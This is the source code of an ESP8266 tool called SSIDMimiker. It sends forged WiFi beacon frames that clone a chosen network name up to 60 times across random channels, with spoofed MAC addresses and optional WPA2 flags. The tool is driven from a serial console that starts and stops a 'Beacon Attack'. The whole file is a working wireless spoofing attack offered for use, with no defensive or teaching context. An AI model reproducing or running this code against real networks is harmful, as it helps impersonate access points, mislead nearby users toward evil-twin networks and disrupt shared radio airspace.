/*
 * SSIDMimiker
 * A tool that broadcasts fake SSIDs on 2.4GHz WiFi via serial console.
 * Author - WireBits
 */

#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

int cloneCount = 0;
String baseSSID = "";
bool wpa2Enabled = true;
bool attackRunning = false;

void handleSerial() {
  if (Serial.available()) {
    String input = Serial.readStringUntil('\n');
    input.trim();
    String command = input;
    command.toLowerCase();
    if (command.startsWith("ssid ")) {
      baseSSID = input.substring(5);
      Serial.println("[*] SSID set to: " + baseSSID);
    } 
    else if (command.startsWith("clone ")) {
      int value = input.substring(6).toInt();
      if (value >= 1 && value <= 60) {
        cloneCount = value;
        Serial.println("[*] Clone count set to: " + String(cloneCount));
      } else {
        Serial.println("[!] Invalid clone count (1–60)");
      }
    } 
    else if (command.startsWith("wpa2 ")) {
      String value = input.substring(5);
      value.toLowerCase();
      if (value == "y") {
        wpa2Enabled = true;
        Serial.println("[*] WPA2 Enabled!");
      } else if (value == "n") {
        wpa2Enabled = false;
        Serial.println("[*] WPA2 Disabled!");
      } else {
        Serial.println("[!] Invalid WPA2 option (use 'y' or 'n')");
      }
    } 
    else if (command == "start") {
      if (baseSSID != "" && cloneCount > 0) {
        attackRunning = true;
        Serial.println("[*] Beacon Attack Started!");
      } else {
        Serial.println("[!] Set SSID and Clone count first!");
      }
    } 
    else if (command == "stop") {
      attackRunning = false;
      Serial.println("[*] Beacon Attack Stopped!");
    } 
    else if (command == "help") {
      showHelp();
    } 
    else {
      Serial.println("[!] Invalid command. Type 'help' for available commands.");
    }
  }
}

void sendCustomBeacons(char* baseSsid, int nr, bool wpa2) {
  int baseLen = strlen(baseSsid);
  int i = 0;
  for (int j = 0; j < 32 - baseLen; j++) {
    for (int k = 0; k < pow(2, j); k++) {
      int kk = k;
      String ssid = baseSsid;
      for (int l = 0; l < j; l++) {
        if (kk % 2 == 1) ssid += " ";
        else ssid += "\t";
        kk /= 2;
      }
      char charBufSsid[33];
      ssid.toCharArray(charBufSsid, 33);
      sendBeacon(charBufSsid, wpa2);
      delay(1);
      if (++i >= nr) return;
    }
  }
}

void sendBeacon(char* ssid, bool wpa2) {
  byte channel = random(1, 12); 
  wifi_set_channel(channel);
  uint8_t packet[256] = {
    0x80, 0x00,
    0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x00, 0x00,
    0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
    0xe8, 0x03,
    0x00, 0x00,
    0x00, 0x20,
  };
  int ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;
  packet[37] = ssidLen;
  for (int i = 0; i < ssidLen; i++) {
    packet[38 + i] = ssid[i];
  }
  int pos = 38 + ssidLen;
  uint8_t ratesAndChannel[] = {
    0x01, 0x08,
    0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
    0x03, 0x01,
    0x00
  };
  ratesAndChannel[10] = channel;
  memcpy(&packet[pos], ratesAndChannel, sizeof(ratesAndChannel));
  pos += sizeof(ratesAndChannel);
  if (wpa2) {
    packet[34] |= 0x10;
    uint8_t rsnInfo[] = {
      0x30, 0x18,
      0x01, 0x00, 
      0x00, 0x0f, 0xac, 0x02,
      0x02, 0x00,
      0x00, 0x0f, 0xac, 0x04,
      0x00, 0x0f, 0xac, 0x04,
      0x01, 0x00,
      0x00, 0x0f, 0xac, 0x02,
      0x00, 0x00
    };
    memcpy(&packet[pos], rsnInfo, sizeof(rsnInfo));
    pos += sizeof(rsnInfo);
  } else {
    packet[34] &= ~0x10;
  }
  for (int i = 0; i < 6; i++) {
    uint8_t r = random(256);
    packet[10 + i] = r;
    packet[16 + i] = r;
  }
  wifi_send_pkt_freedom(packet, pos, 0);
}

void showHelp() {
  Serial.println("\nAvailable Commands:");
  Serial.println("  ssid SSIDNAME     - Sets the SSID for Beacon Attack");
  Serial.println("  clone X           - Sets the number of clones (X = 1 to 60)");
  Serial.println("  wpa2 y/n          - Enables/Disables WPA2 encryption for the fake SSIDs");
  Serial.println("  start             - Starts the beacon attack");
  Serial.println("  stop              - Stops the beacon attack");
  Serial.println("  help              - Displays this help message\n");
}

void setup() {
  Serial.begin(115200);
  delay(500);
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);
}

void loop() {
  handleSerial();
  if (attackRunning) {
    sendCustomBeacons((char*)baseSSID.c_str(), cloneCount, wpa2Enabled);
  }
}
